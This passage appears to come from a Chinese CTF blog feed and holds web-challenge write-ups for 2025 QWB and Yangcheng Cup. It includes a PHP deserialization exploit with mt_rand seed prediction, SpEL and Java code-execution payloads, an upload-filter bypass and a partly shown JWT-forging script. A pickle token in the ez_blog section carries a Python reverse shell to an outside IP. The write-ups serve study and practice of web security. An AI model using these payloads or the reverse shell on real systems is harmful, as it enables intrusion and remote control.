class="keyword">for</span> (<span class="variable">$filename</span> = <span class="number">0</span>; <span class="variable">$filename</span> &lt; <span class="number">2000000000</span>; <span class="variable">$filename</span>++) &#123;</span><br><span class="line">        <span class="variable">$seed</span> = <span class="variable">$time</span> . <span class="title function_ invoke__">intval</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="title function_ invoke__">mt_srand</span>(<span class="variable">$seed</span>);</span><br><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">generateRandomString</span>(<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$s</span>, <span class="string">&#x27;phar&#x27;</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;found: filename=<span class="subst">$filename</span> seed=<span class="subst">$seed</span> =&gt; <span class="subst">$s</span>\n&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$filename</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getPaylaod</span>(<span class="params"><span class="variable">$filenameSeed</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$obj1</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line">    <span class="variable">$obj1</span>-&gt;f = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line">    <span class="variable">$obj1</span>-&gt;key = <span class="string">&#x27;class&#x27;</span>;</span><br><span class="line">    <span class="variable">$obj1</span>-&gt;readflag = <span class="variable">$filenameSeed</span>;</span><br><span class="line">    <span class="variable">$obj2</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line">    <span class="variable">$obj2</span>-&gt;f = [<span class="string">&quot;class@anonymous\0/var/www/html/index.php(1) : eval()&#x27;d code:1<span class="subst">$0</span>&quot;</span>, <span class="string">&#x27;readflag&#x27;</span>];</span><br><span class="line">    <span class="variable">$obj2</span>-&gt;key = <span class="string">&#x27;func&#x27;</span>;</span><br><span class="line">    <span class="variable">$obj3</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line">    <span class="variable">$obj3</span>-&gt;f = <span class="string">&#x27;readflag&#x27;</span>;</span><br><span class="line">    <span class="variable">$obj3</span>-&gt;key = <span class="string">&#x27;func&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$ser</span>= [<span class="variable">$obj1</span>, <span class="variable">$obj2</span>, <span class="variable">$obj3</span>];</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$ser</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$s</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">send</span>(<span class="params"><span class="variable">$url</span>, <span class="variable">$paylaod</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$client</span> = <span class="keyword">new</span> <span class="title class_">Client</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$response</span> = <span class="variable">$client</span>-&gt;<span class="title function_ invoke__">request</span>(<span class="string">&#x27;POST&#x27;</span>, <span class="variable">$url</span> . <span class="string">&#x27;?land=&#x27;</span> . <span class="variable">$paylaod</span> , [</span><br><span class="line">        <span class="string">&#x27;verify&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&#x27;multipart&#x27;</span> =&gt; [</span><br><span class="line">            [</span><br><span class="line">                <span class="string">&#x27;name&#x27;</span>     =&gt; <span class="string">&#x27;file&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;contents&#x27;</span> =&gt; <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;./nacl.txt.gz&#x27;</span>, <span class="string">&#x27;r&#x27;</span>),</span><br><span class="line">                <span class="string">&#x27;filename&#x27;</span> =&gt; <span class="string">&#x27;myfile.txt&#x27;</span></span><br><span class="line">            ]</span><br><span class="line">        ]</span><br><span class="line">    ]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">getBody</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;https://eci-2zedemapdb0d7dh3b4cn.cloudeci1.ichunqiu.com:80/&#x27;</span>;</span><br><span class="line"><span class="variable">$paylaod</span> = <span class="title function_ invoke__">getPaylaod</span>(<span class="title function_ invoke__">getFilename</span>());</span><br><span class="line"><span class="title function_ invoke__">send</span>(<span class="variable">$url</span>, <span class="variable">$paylaod</span>);</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">D:\softwares\phpstudy_pro\Extensions\php\php7.4.3nts\php.exe -c D:\softwares\phpstudy_pro\Extensions\php\php7.4.3nts\php.ini E:\CTFDoc\2025\qwb\testezphp\testsend.php</span><br><span class="line">found: filename=853950 seed=2208853950 =&gt; pharveld</span><br><span class="line">error&lt;code&gt;&lt;span style=<span class="string">&quot;color: #000000&quot;</span>&gt;</span><br><span class="line">&lt;span style=<span class="string">&quot;color: #0000BB&quot;</span>&gt;&amp;lt;?=&lt;/span&gt;&lt;span style=<span class="string">&quot;color: #007700&quot;</span>&gt;<span class="built_in">eval</span>(&lt;/span&gt;&lt;span style=<span class="string">&quot;color: #0000BB&quot;</span>&gt;base64_decode&lt;/span&gt;&lt;span style=<span class="string">&quot;color: #007700&quot;</span>&gt;(&lt;/span&gt;&lt;span style=<span class="string">&quot;color: #DD0000&quot;</span>&gt;<span class="string">&#x27;ZnVuY3Rpb24gZ2VuZXJhdGVSYW5kb21TdHJpbmcoJGxlbmd0aCA9IDgpeyRjaGFyYWN0ZXJzID0gJ2FiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6JzskcmFuZG9tU3RyaW5nID0gJyc7Zm9yICgkaSA9IDA7ICRpIDwgJGxlbmd0aDsgJGkrKykgeyRyID0gcmFuZCgwLCBzdHJsZW4oJGNoYXJhY3RlcnMpIC0gMSk7JHJhbmRvbVN0cmluZyAuPSAkY2hhcmFjdGVyc1skcl07fXJldHVybiAkcmFuZG9tU3RyaW5nO31kYXRlX2RlZmF1bHRfdGltZXpvbmVfc2V0KCdBc2lhL1NoYW5naGFpJyk7Y2xhc3MgdGVzdHtwdWJsaWMgJHJlYWRmbGFnO3B1YmxpYyAkZjtwdWJsaWMgJGtleTtwdWJsaWMgZnVuY3Rpb24gX19jb25zdHJ1Y3QoKXskdGhpcy0+cmVhZGZsYWcgPSBuZXcgY2xhc3Mge3B1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgpe2lmIChpc3NldCgkX0ZJTEVTWydmaWxlJ10pICYmICRfRklMRVNbJ2ZpbGUnXVsnZXJyb3InXSA9PSAwKSB7JHRpbWUgPSBkYXRlKCdIaScpOyRmaWxlbmFtZSA9ICRHTE9CQUxTWydmaWxlbmFtZSddOyRzZWVkID0gJHRpbWUgLiBpbnR2YWwoJGZpbGVuYW1lKTttdF9zcmFuZCgkc2VlZCk7JHVwbG9hZERpciA9ICd1cGxvYWRzLyc7JGZpbGVzID0gZ2xvYigkdXBsb2FkRGlyIC4gJyonKTtmb3JlYWNoICgkZmlsZXMgYXMgJGZpbGUpIHtpZiAoaXNfZmlsZSgkZmlsZSkpIHVubGluaygkZmlsZSk7fSRyYW5kb21TdHIgPSBnZW5lcmF0ZVJhbmRvbVN0cmluZyg4KTskbmV3RmlsZW5hbWUgPSAkdGltZSAuICcuJyAuICRyYW5kb21TdHIgLiAnLicgLiAnanBnJzskR0xPQkFMU1snZmlsZSddID0gJG5ld0ZpbGVuYW1lOyR1cGxvYWRlZEZpbGUgPSAkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ107JHVwbG9hZFBhdGggPSAkdXBsb2FkRGlyIC4gJG5ld0ZpbGVuYW1lOyBpZiAoc3lzdGVtKCJjcCAiLiR1cGxvYWRlZEZpbGUuIiAiLiAkdXBsb2FkUGF0aCkpIHtlY2hvICJzdWNjZXNzIHVwbG9hZCEiO30gZWxzZSB7ZWNobyAiZXJyb3IiO319fXB1YmxpYyBmdW5jdGlvbiBfX3dha2V1cCgpe3BocGluZm8oKTt9cHVibGljIGZ1bmN0aW9uIHJlYWRmbGFnKCl7ZnVuY3Rpb24gcmVhZGZsYWcoKXtpZiAoaXNzZXQoJEdMT0JBTFNbJ2ZpbGUnXSkpIHskZmlsZSA9ICRHTE9CQUxTWydmaWxlJ107JGZpbGUgPSBiYXNlbmFtZSgkZmlsZSk7aWYgKHByZWdfbWF0Y2goJy86XC9cLy8nLCAkZmlsZSkpZGllKCJlcnJvciIpOyRmaWxlX2NvbnRlbnQgPSBmaWxlX2dldF9jb250ZW50cygidXBsb2Fkcy8iIC4gJGZpbGUpO2lmIChwcmVnX21hdGNoKCcvPFw/fFw6XC9cL3xwaHxcP1w9L2knLCAkZmlsZV9jb250ZW50KSkge2RpZSgiSWxsZWdhbCBjb250ZW50IGRldGVjdGVkIGluIHRoZSBmaWxlLiIpO31pbmNsdWRlKCJ1cGxvYWRzLyIgLiAkZmlsZSk7fX19fTt9cHVibGljIGZ1bmN0aW9uIF9fZGVzdHJ1Y3QoKXskZnVuYyA9ICR0aGlzLT5mOyRHTE9CQUxTWydmaWxlbmFtZSddID0gJHRoaXMtPnJlYWRmbGFnO2lmICgkdGhpcy0+a2V5ID09ICdjbGFzcycpbmV3ICRmdW5jKCk7ZWxzZSBpZiAoJHRoaXMtPmtleSA9PSAnZnVuYycpIHskZnVuYygpO30gZWxzZSB7aGlnaGxpZ2h0X2ZpbGUoJ2luZGV4LnBocCcpO319fSRzZXIgPSBpc3NldCgkX0dFVFsnbGFuZCddKSA/ICRfR0VUWydsYW5kJ10gOiAnTzo0OiJ0ZXN0IjpOJztAdW5zZXJpYWxpemUoJHNlcik7&#x27;</span>&lt;/span&gt;&lt;span style=<span class="string">&quot;color: #007700&quot;</span>&gt;));&lt;br /&gt;&lt;/span&gt;</span><br><span class="line">&lt;/span&gt;</span><br><span class="line">&lt;/code&gt;/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/base64</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/libexec/polkit-agent-helper-1</span><br><span class="line">flag&#123;65a539ad-ca4b-4c2b-9b58-351e9d713da2&#125;</span><br><span class="line">Process finished with <span class="built_in">exit</span> code 0</span><br></pre></td></tr></table></figure><h2 id="bbjv"><a href="#bbjv" class="headerlink" title="bbjv"></a>bbjv</h2><p>简单的spel注入<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20251020214106.png" alt="image.png"></p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20251020214114.png" alt="image.png"></p><p>我们可以直接构造spl去修改user.home的值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#&#123;#systemProperties[&#x27;user.home&#x27;] = &#x27;/tmp&#x27;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20251020214134.png" alt="image.png"></p><h2 id="yamcs"><a href="#yamcs" class="headerlink" title="yamcs"></a>yamcs</h2><p>通过ai分析源码加黑盒测试, 我们可以发现这个位置可以编译执行任意java代码</p><p>&#x2F;algorithms&#x2F;myproject&#x2F;copySunsensor&#x2F;-&#x2F;summary?c&#x3D;myproject__realtime<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20251020214149.png" alt="image.png"><br>并且根据</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">out0.<span class="title function_ invoke__">setFloatValue</span>(in.<span class="title function_ invoke__">getEngValue</span>().<span class="title function_ invoke__">getFloatValue</span>());</span><br></pre></td></tr></table></figure><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20251020214202.png" alt="image.png"></p><p>我们发现out0.setFloatValue可以写入Float并在trace处显示</p><p>我们尝试</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">out0.<span class="title function_ invoke__">setStringValue</span>(<span class="string">&quot;nacl&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20251020214216.png" alt="image.png"><br>这样就可以回显字符串</p><p>最终paylaod</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">byte</span>[] data = java.nio.file.Files.readAllBytes(</span><br><span class="line">        java.nio.file.Paths.get(<span class="string">&quot;/flag&quot;</span>)</span><br><span class="line">    );</span><br><span class="line">    flag = <span class="keyword">new</span> <span class="title class_">String</span>(data, java.nio.charset.StandardCharsets.UTF_8).trim();</span><br><span class="line">    out0.setStringValue(flag);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;&#125;</span><br><span class="line"></span><br><span class="line">out0.setStringValue(flag);</span><br></pre></td></tr></table></figure><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20251020214229.png" alt="image.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;SecretVault&quot;&gt;&lt;a href=&quot;#SecretVault&quot; class=&quot;headerlink&quot; title=&quot;SecretVault&quot;&gt;&lt;/a&gt;SecretVault&lt;/h2&gt;&lt;p&gt;经典go前置python后置题目, 此类题目90%情况考虑请求走私&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>2025 羊城杯 WEB WP 题解 (含 金Java)</title>
    <link href="http://example.com/2025/10/13/2025-%E7%BE%8A%E5%9F%8E%E6%9D%AF-WEB-WP-%E5%90%AB-%E9%87%91Java/"/>
    <id>http://example.com/2025/10/13/2025-%E7%BE%8A%E5%9F%8E%E6%9D%AF-WEB-WP-%E5%90%AB-%E9%87%91Java/</id>
    <published>2025-10-13T14:11:33.000Z</published>
    <updated>2025-10-14T08:33:37.244Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2025-羊城杯-WEB-WP-题解-含-金Java"><a href="#2025-羊城杯-WEB-WP-题解-含-金Java" class="headerlink" title="2025 羊城杯 WEB WP 题解 (含 金Java)"></a>2025 羊城杯 WEB WP 题解 (含 金Java)</h1><h2 id="ez-unserialize"><a href="#ez-unserialize" class="headerlink" title="ez_unserialize"></a>ez_unserialize</h2><p>简单的php反序列化<br>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$first</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$step</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$next</span>;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$you</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$found</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">F</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fifth</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$step</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$finalstep</span>;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">H</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$who</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$are</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$you</span>;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">N</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$congratulation</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$yougotit</span>;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">U</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$almost</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$there</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">V</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$good</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$keep</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dowhat</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$go</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="variable">$ser</span> = <span class="keyword">new</span> <span class="title function_ invoke__">H</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$ser</span>-&gt;who =  <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$ser</span>-&gt;who-&gt;next = <span class="keyword">new</span> <span class="title function_ invoke__">V</span>();</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="variable">$ser</span>-&gt;who-&gt;next-&gt;dowhat = <span class="string">&#x27;secret&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ser</span>-&gt;who-&gt;next-&gt;go = <span class="keyword">new</span> <span class="title function_ invoke__">E</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// $ser-&gt;who-&gt;next-&gt;go-&gt;found = new N();</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$ser</span>-&gt;who-&gt;next-&gt;go-&gt;found = <span class="keyword">new</span> <span class="title function_ invoke__">F</span>();</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="variable">$ser</span>-&gt;who-&gt;next-&gt;go-&gt;found-&gt;finalstep = <span class="string">&quot;u&quot;</span>;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$ser</span>));</span><br></pre></td></tr></table></figure><h2 id="ez-blog"><a href="#ez-blog" class="headerlink" title="ez_blog"></a>ez_blog</h2><p>token中是一个十六进制的pickle</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># gen_token.py  </span></span><br><span class="line"><span class="comment"># 生成一个 pickle token（protocol 4），并以十六进制字符串输出  </span></span><br><span class="line"><span class="keyword">import</span> pickle  </span><br><span class="line"><span class="keyword">import</span> binascii  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_user_token</span>(<span class="params">username=<span class="string">&quot;guest&quot;</span>, is_admin=<span class="literal">False</span>, logged_in=<span class="literal">True</span>, protocol=<span class="number">4</span></span>):  </span><br><span class="line">    opcode = <span class="string">b&#x27;&#x27;&#x27;cos  </span></span><br><span class="line"><span class="string">system  </span></span><br><span class="line"><span class="string">(S&#x27;python -c \&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;107.148.75.202&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)\&#x27;&#x27;  </span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span>  </span><br><span class="line">    <span class="comment"># 输出为 hex（小写），与你给出的格式一致（无前缀）  </span></span><br><span class="line">    hexstr = binascii.hexlify(opcode).decode(<span class="string">&#x27;ascii&#x27;</span>)  </span><br><span class="line">    <span class="keyword">return</span> hexstr, opcode  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:  </span><br><span class="line">    hexstr, raw = make_user_token()  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Token (hex):&quot;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(hexstr)  </span><br><span class="line">    <span class="comment"># 如果你喜欢以 &quot;Token=&quot; 前缀显示：  </span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nToken=&quot;</span> + hexstr)</span><br></pre></td></tr></table></figure><h2 id="staticNodeService"><a href="#staticNodeService" class="headerlink" title="staticNodeService"></a>staticNodeService</h2><p>用node实现了一个简单的http服务</p><p>可以put任何文件到web服务器根目录<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20251014121439.png" alt="image.png"></p><p>可以根据传入参数选择要渲染的模板文件<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20251014121537.png" alt="image.png"></p><p>思路是上传ejs到view目录, 但是题目不允许js结尾的文件上传<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20251014121516.png" alt="image.png"><br>经过测试可以上传</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PUT /views/nacl.ejs/.</span><br></pre></td></tr></table></figure><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20251014121930.png" alt="image.png"></p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20251014121942.png" alt="image.png"></p><h2 id="authweb"><a href="#authweb" class="headerlink" title="authweb"></a>authweb</h2><p>伪造jwt后可以进行ssti<br>exp.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt  </span><br><span class="line"><span class="keyword">import</span> datetime  </span><br><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 秘钥  </span></span><br><span class="line">secret = <span class="string">&quot;25d55ad283aa400af464c76d713c07add57f21e6a273781dbf8b7657940f3b03&quot;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 用户名  </span></span><br><span class="line">username = <span class="string">&quot;user1&quot;</span>  <span class="comment"># 或 &quot;admin&quot;  </span></span><br><span class="line"><span class="comment"># 构造 payloadpayload = &#123;  </span></span><br><span class="line">    <span class="string">&quot;sub&quot;</span>: username,                     <span class="comment"># JWT subject，Java 里 getSubject() 获取  </span></span><br><span class="line">    <span class="string">&quot;iat&quot;</span>: datetime.datetime.utcnow(),   <span class="comment"># 签发时间  </span></span><br><span class="line">    <span 